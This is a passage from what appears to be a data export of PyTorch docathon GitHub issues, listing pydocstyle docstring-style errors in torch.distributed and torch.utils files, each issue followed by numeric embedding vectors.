- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_pg_default_device`, **Line**: 546, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_store_based_barrier`, **Line**: 614, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_store_based_barrier`, **Line**: 614, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_rank_not_in_group`, **Line**: 661, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_rank_not_in_group`, **Line**: 661, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_global_rank`, **Line**: 728, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_global_rank`, **Line**: 728, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_group_size`, **Line**: 751, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_group_size`, **Line**: 751, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_single_tensor`, **Line**: 761, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_single_tensor`, **Line**: 761, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_tensor_list`, **Line**: 772, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_tensor_list`, **Line**: 772, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_op`, **Line**: 805, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_op`, **Line**: 805, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_p2p_op_list`, **Line**: 817, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_p2p_op_list`, **Line**: 817, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_check_p2p_op_list`, **Line**: 817, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_mpi_available`, **Line**: 835, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_mpi_available`, **Line**: 835, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_nccl_available`, **Line**: 842, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_nccl_available`, **Line**: 842, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_gloo_available`, **Line**: 849, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_gloo_available`, **Line**: 849, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_ucc_available`, **Line**: 856, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_ucc_available`, **Line**: 856, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_backend_available`, **Line**: 863, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_backend_available`, **Line**: 863, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_backend_available`, **Line**: 863, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_initialized`, **Line**: 881, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_initialized`, **Line**: 881, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_initialized`, **Line**: 881, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checking')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_torchelastic_launched`, **Line**: 888, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_torchelastic_launched`, **Line**: 888, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `is_torchelastic_launched`, **Line**: 888, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_group`, **Line**: 908, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_group`, **Line**: 908, **Description**: First line should end with a period (not 'p')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_group`, **Line**: 908, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Getting')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_store`, **Line**: 920, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_store`, **Line**: 920, **Description**: First line should end with a period (not 'p')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_default_store`, **Line**: 920, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Getting')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_backend`, **Line**: 948, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `init_process_group`, **Line**: 983, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `init_process_group`, **Line**: 983, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `init_process_group`, **Line**: 983, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `destroy_process_group`, **Line**: 1341, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_rank`, **Line**: 1410, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_rank`, **Line**: 1410, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_rank`, **Line**: 1410, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_world_size`, **Line**: 1438, **Description**: First line should end with a period (not 'p')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `get_world_size`, **Line**: 1438, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `isend`, **Line**: 1457, **Description**: First line should be in imperative mood (perhaps 'Send', not 'Sends')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `send`, **Line**: 1533, **Description**: First line should be in imperative mood (perhaps 'Send', not 'Sends')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_coalescing_manager`, **Line**: 1633, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `broadcast_multigpu`, **Line**: 1777, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `broadcast_multigpu`, **Line**: 1777, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_reduce_multigpu`, **Line**: 1879, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_reduce_multigpu`, **Line**: 1879, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_reduce`, **Line**: 1940, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_reduce`, **Line**: 1940, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_reduce_coalesced`, **Line**: 2020, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `reduce_multigpu`, **Line**: 2085, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `reduce_multigpu`, **Line**: 2085, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_gather_multigpu`, **Line**: 2192, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_gather_object`, **Line**: 2284, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_gather_object`, **Line**: 2284, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `gather_object`, **Line**: 2376, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `broadcast_object_list`, **Line**: 2486, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `broadcast_object_list`, **Line**: 2486, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `scatter_object_list`, **Line**: 2593, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `scatter_object_list`, **Line**: 2593, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `reduce_scatter_multigpu`, **Line**: 3146, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `reduce_scatter_multigpu`, **Line**: 3146, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_to_all_single`, **Line**: 3376, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_to_all_single`, **Line**: 3376, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_to_all`, **Line**: 3500, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `all_to_all`, **Line**: 3500, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `barrier`, **Line**: 3620, **Description**: No blank lines allowed before function docstring (found 1)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `barrier`, **Line**: 3620, **Description**: First line should be in imperative mood (perhaps 'Synchronize', not 'Synchronizes')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `monitored_barrier`, **Line**: 3663, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `monitored_barrier`, **Line**: 3663, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `monitored_barrier`, **Line**: 3663, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `monitored_barrier`, **Line**: 3663, **Description**: First line should be in imperative mood (perhaps 'Synchronize', not 'Synchronizes')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_group`, **Line**: 3766, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_new_group_with_tag`, **Line**: 3847, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups`, **Line**: 3951, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups`, **Line**: 3951, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups`, **Line**: 3951, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups_by_enumeration`, **Line**: 4082, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups_by_enumeration`, **Line**: 4082, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `new_subgroups_by_enumeration`, **Line**: 4082, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_group_tag`, **Line**: 4222, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_group_tag`, **Line**: 4222, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')

cc @carljparker",False,"[-0.21400803 -0.17567302 -0.0885882  -0.11116365  0.07701004 -0.19260356
 -0.14905486  0.20455763 -0.36657208  0.12399434  0.05148323 -0.08059546
  0.18270642  0.12005011 -0.11969185  0.05893116 -0.2713411  -0.5761057
  0.1385411   0.11306811 -0.03504817  0.5002818  -0.09446929  0.04473743
 -0.01262444  0.12152757 -0.45932773 -0.13650015  0.01955221  0.1482313
  0.34594017  0.08273179 -0.2464712   0.16453785  0.37978715  0.2679488
 -0.169801   -0.08172809 -0.01294798  0.10083544  0.03137062 -0.1653916
 -0.09873836 -0.01062415  0.08588764 -0.20798764 -0.23184398  0.30515838
 -0.09823808  0.09889925 -0.03355301  0.09078331 -0.1982587   0.06997682
  0.22266538 -0.0414652  -0.06458256  0.53866696  0.11262748 -0.05995262
  0.18327647  0.14094637 -0.01290227  0.04411791 -0.11597437  0.25346795
  0.00802847  0.14119634  0.31754807  0.1202064  -0.18721038  0.08186199
 -0.32715943 -0.28264245 -0.01105371  0.2646631  -0.4392648  -0.08620018
 -0.30594856 -0.40913385 -0.1862041   0.11546655  0.01848752  0.20733507
 -0.02607012 -0.15325606  0.36009452 -0.0952702   0.43380538  0.09278543
  0.38554344 -0.07853154 -0.03702911  0.33694056 -0.08048552  0.25598657
 -0.02791433 -0.02224953  0.09003039 -0.08558141  0.13842842 -0.38727835
 -0.12235358  0.03695371 -0.05114994 -0.06075731  0.1675587   0.07240367
  0.11657878 -0.06267048  0.13547286 -0.08141182 -0.11471403 -0.02996225
  0.25262135  0.01899607 -0.16862676 -0.06324759 -0.2593959  -0.04115149
  0.22279827  0.1764542   0.0708726   0.05953253  0.23117714  0.04414063
  0.2563867  -0.02667818 -0.00282586 -0.17140257  0.13118419  0.06164631
 -0.13371547  0.12793241  0.24221978  0.25437474 -0.14379779 -0.20198105
  0.01739108  0.01350689 -0.23862436 -0.32369602 -0.18830428 -0.31402484
  0.29099977  0.17573611 -0.3801055   0.26949942  0.01736052  0.19898084
 -0.01918643 -0.04126844 -0.2897628   0.4719589   0.02361812 -0.00392267
  0.5301571   0.08775378  0.06726256 -0.35990226 -0.09806786  0.12899902
 -0.08265238  0.13092217 -0.24699655  0.11282519 -0.3033669  -0.15012363
 -0.32734302 -0.16121387  0.03798632 -0.01770188  0.02393244 -0.08108241
  0.09932805  0.06153794  0.0105614  -0.15089402  0.00612607  0.31765836
  0.16330019  0.60066074  0.18735942  0.11920802 -0.20846118  0.21323928
  0.2326203  -0.07051909  0.12888476  0.19698808 -0.1689737  -0.20720655
  0.09237464 -0.02134676 -0.11236671  0.01698032  0.23573785  0.50812507
  0.06801656  0.3359233  -0.3056315   0.2923902   0.29871315 -0.1597732
  0.5614962   0.01900615 -0.41019267 -0.40433934 -0.24370772  0.11037187
 -0.33971518 -0.12913696  0.10285709 -0.27726197 -0.24225637  0.4088987
 -0.11009923 -0.29432666  0.2992719  -0.08792931 -0.25561178 -0.07513723
 -0.07745483 -0.2768576   0.25242692  0.20559305 -0.12294958 -0.23606986
 -0.00481504 -0.0828515  -0.09636433 -0.10591629  0.40291345 -0.07556809
  0.11043997  0.14458862 -0.09120317 -0.1307411   0.09357029  0.3018352
 -0.18387008 -0.23662142 -0.05180519 -0.05847281  0.06350353  0.06893153
 -0.15652657  0.10403051 -0.29015762  0.12076029 -0.1778196  -0.23119
  0.04774178 -0.04333212  0.63796794  0.04905402 -0.1603826   0.00541531
 -0.14273465 -0.0737823  -0.10217647  0.2965924  -0.20631883  0.15129974
  0.28987825 -0.25465152 -0.30258352  0.26128623 -0.1969873  -0.12465398
  0.18913057 -0.50190914  0.42464978  0.20673683  0.2598682  -0.02426669
  0.4020164  -0.05449858  0.14310479  0.04387087 -0.14201728  0.42128307
 -0.3588562  -0.06928188  0.33916914 -0.13711756 -0.2230308  -0.14944805
 -0.47489238 -0.16911116 -0.23382843  0.12792611  0.14881063  0.05291164
  0.01980795  0.14423475 -0.08057475 -0.01884343  0.26351503  0.22813328
 -0.40166458 -0.12059721 -0.12796277  0.35771993  0.01441794  0.24689513
  0.07845701  0.15376297  0.18588953 -0.36866474  0.3495792   0.20577163
 -0.24501115  0.33050805 -0.07049722  0.08388719 -0.1205554   0.4408489
  0.05868768  0.12904124 -0.04683547 -0.34901127 -0.23568767  0.09912526
  0.02629852 -0.04785049 -0.49794817  0.09693497 -0.3097028  -0.21832693
  0.18647033 -0.01407491 -0.05868973 -0.14389679 -0.03153433 -0.09253867
 -0.13083056  0.18128863 -0.11946844 -0.24997088 -0.005162   -0.2041248
  0.03103361 -0.47427517 -0.0648144  -0.05928841  0.22939205  0.19294384
 -0.31872654 -0.38620228  0.54318017 -0.07560974 -0.3786231   0.06167948
 -0.22737917  0.48133457 -0.03882084  0.27476573 -0.06565236  0.29478195
 -0.44726235  0.04138447 -0.18632239 -0.20553891 -0.00147488 -0.2745962
 -0.14273094 -0.00816074  0.21144879 -0.10559426 -0.3761424   0.15338662
 -0.17827766  0.31346467  0.37991607  0.07044924  0.10168009  0.0007195
  0.04674002 -0.23672907 -0.39888602  0.2630232   0.37008798 -0.05010308]"
"Fix docstring errors in _composable_state.py, remote_device.py, value_ranges.py, utils.py, run.py, rendezvous.py, launch.py, argparse_util.py, __init__.py, _cycles.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `increasing_map`, **Line**: 104, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `increasing_map`, **Line**: 104, **Description**: First word of the first line should be properly capitalized ('Map', not 'map')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `decreasing_map`, **Line**: 110, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `decreasing_map`, **Line**: 110, **Description**: First word of the first line should be properly capitalized ('Map', not 'map')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `monotone_map`, **Line**: 116, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `monotone_map`, **Line**: 116, **Description**: First word of the first line should be properly capitalized ('Check', not 'check')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `convex_min_zero_map`, **Line**: 124, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `convex_min_zero_map`, **Line**: 124, **Description**: First line should be in imperative mood; try rephrasing (found 'the')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `convex_min_zero_map`, **Line**: 124, **Description**: First word of the first line should be properly capitalized ('The', not 'the')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `coordinatewise_increasing_map`, **Line**: 133, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `coordinatewise_increasing_map`, **Line**: 133, **Description**: First word of the first line should be properly capitalized ('Map', not 'map')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `coordinatewise_monotone_map`, **Line**: 142, **Description**: First line should end with a period (not 'x')
- **File**: `torch/utils/_sympy/value_ranges.py`, **Entity**: `coordinatewise_monotone_map`, **Line**: 142, **Description**: First word of the first line should be properly capitalized ('Compute', not 'compute')
- **File**: `torch/utils/viz/_cycles.py`, **Entity**: `object_annotation`, **Line**: 207, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/viz/_cycles.py`, **Entity**: `object_annotation`, **Line**: 207, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/viz/_cycles.py`, **Entity**: `warn_tensor_cycles`, **Line**: 435, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/viz/_cycles.py`, **Entity**: `warn_tensor_cycles`, **Line**: 435, **Description**: First line should end with a period (not 'p')
- **File**: `torch/utils/viz/_cycles.py`, **Entity**: `warn_tensor_cycles`, **Line**: 435, **Description**: First line should be in imperative mood; try rephrasing (found 'Reference')
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `env`, **Line**: 13, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `env`, **Line**: 13, **Description**: First line should end with a period (not 'g')
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `env`, **Line**: 13, **Description**: No blank lines allowed between a section header and its content ('Example')
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `check_env`, **Line**: 61, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `check_env`, **Line**: 61, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/argparse_util.py`, **Entity**: `check_env`, **Line**: 61, **Description**: No blank lines allowed between a section header and its content ('Example')
- **File**: `torch/distributed/_composable_state.py`, **Entity**: `_get_module_state`, **Line**: 20, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/_composable_state.py`, **Entity**: `_get_module_state`, **Line**: 20, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/_composable_state.py`, **Entity**: `_get_module_state`, **Line**: 20, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/launch.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/launch.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/remote_device.py`, **Entity**: `worker_name`, **Line**: 81, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/remote_device.py`, **Entity**: `worker_name`, **Line**: 81, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/remote_device.py`, **Entity**: `rank`, **Line**: 88, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/remote_device.py`, **Entity**: `rank`, **Line**: 88, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/remote_device.py`, **Entity**: `device`, **Line**: 95, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/remote_device.py`, **Entity**: `device`, **Line**: 95, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/rendezvous.py`, **Entity**: `register_rendezvous_handler`, **Line**: 23, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/distributed/rendezvous.py`, **Entity**: `_create_c10d_store`, **Line**: 151, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/rendezvous.py`, **Entity**: `_create_c10d_store`, **Line**: 151, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/run.py`, **Entity**: ``, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/run.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/run.py`, **Entity**: `get_args_parser`, **Line**: 393, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/run.py`, **Entity**: `get_args_parser`, **Line**: 393, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/distributed/run.py`, **Entity**: `get_use_env`, **Line**: 668, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/run.py`, **Entity**: `get_use_env`, **Line**: 668, **Description**: First line should be in imperative mood (perhaps 'Retrieve', not 'Retrieves')
- **File**: `torch/distributed/run.py`, **Entity**: `run_script_path`, **Line**: 761, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/run.py`, **Entity**: `run_script_path`, **Line**: 761, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/__init__.py`, **Entity**: `is_available`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/__init__.py`, **Entity**: `is_available`, **Line**: 8, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/__init__.py`, **Entity**: `is_available`, **Line**: 8, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/utils.py`, **Entity**: `_pack_kwargs`, **Line**: 16, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/utils.py`, **Entity**: `_pack_kwargs`, **Line**: 16, **Description**: First line should end with a period (not ')')
- **File**: `torch/distributed/utils.py`, **Entity**: `_cast_forward_inputs`, **Line**: 47, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/utils.py`, **Entity**: `_recursive_to`, **Line**: 88, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/utils.py`, **Entity**: `_p_assert`, **Line**: 141, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/utils.py`, **Entity**: `_p_assert`, **Line**: 141, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/distributed/utils.py`, **Entity**: `_p_assert`, **Line**: 141, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/utils.py`, **Entity**: `_p_assert`, **Line**: 141, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_module_states`, **Line**: 276, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_module_states`, **Line**: 276, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_module_states`, **Line**: 276, **Description**: First line should be in imperative mood (perhaps 'Sync', not 'Syncs')
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_params_and_buffers`, **Line**: 301, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_params_and_buffers`, **Line**: 301, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/utils.py`, **Entity**: `_sync_params_and_buffers`, **Line**: 301, **Description**: First line should be in imperative mood (perhaps 'Synchronize', not 'Synchronizes')

cc @carljparker",False,"[-4.23758551e-02 -4.58900273e-01  1.93916261e-02 -2.80480802e-01
  4.21731919e-02 -1.81335658e-01 -9.16060358e-02 -9.41516757e-02
 -3.05252552e-01  1.32933319e-01  1.45073101e-01  6.25642762e-02
  1.71102017e-01  3.07463765e-01 -6.49025384e-03  1.88368350e-01
 -3.09100747e-01 -4.66020435e-01  3.59053135e-01  3.56465816e-01
  2.62532890e-01  4.17300940e-01 -1.98220134e-01  6.42827600e-02
 -4.19720411e-01  2.24763304e-01 -2.62739390e-01 -1.74662441e-01
 -3.27768214e-02  1.13148838e-01  4.39227104e-01  2.67530948e-01
 -2.21280798e-01  1.62678696e-02  4.59432781e-01  2.66944706e-01
 -2.66715050e-01 -3.31945986e-01 -1.86674949e-02 -2.93989666e-03
  5.94612136e-02 -1.89379781e-01 -6.26702830e-02 -1.34149194e-01
  4.43501696e-02 -2.15395451e-01 -2.57195622e-01  3.06819677e-01
 -9.91471931e-02  1.04893856e-01 -2.85331681e-02  1.03574917e-01
 -2.89018363e-01 -1.48776412e-01  3.28299403e-01  4.88450825e-02
 -4.66779955e-02  6.14987075e-01 -3.29143703e-02 -6.85873330e-02
  1.50289118e-01  3.63471434e-02 -8.31069350e-02  2.18390584e-01
 -3.87378544e-01  4.45880592e-01  1.05648816e-01  1.99132696e-01
  4.54455316e-01 -1.57120191e-02 -2.95905173e-01  1.16873398e-01
 -4.75634068e-01 -1.21317953e-01  6.40560240e-02  4.02601063e-01
 -2.95494854e-01 -1.41962454e-01 -3.97970676e-01 -3.03714782e-01
 -2.59826630e-01 -6.72775209e-02  7.22199753e-02 -8.18594322e-02
  1.13205656e-01 -1.92631781e-01  2.62190402e-01 -9.86050069e-02
  1.12038203e-01  1.75872773e-01  4.01697457e-01 -6.85654283e-02
 -3.87078151e-02  3.11653316e-01  2.26814568e-01  3.33516747e-01
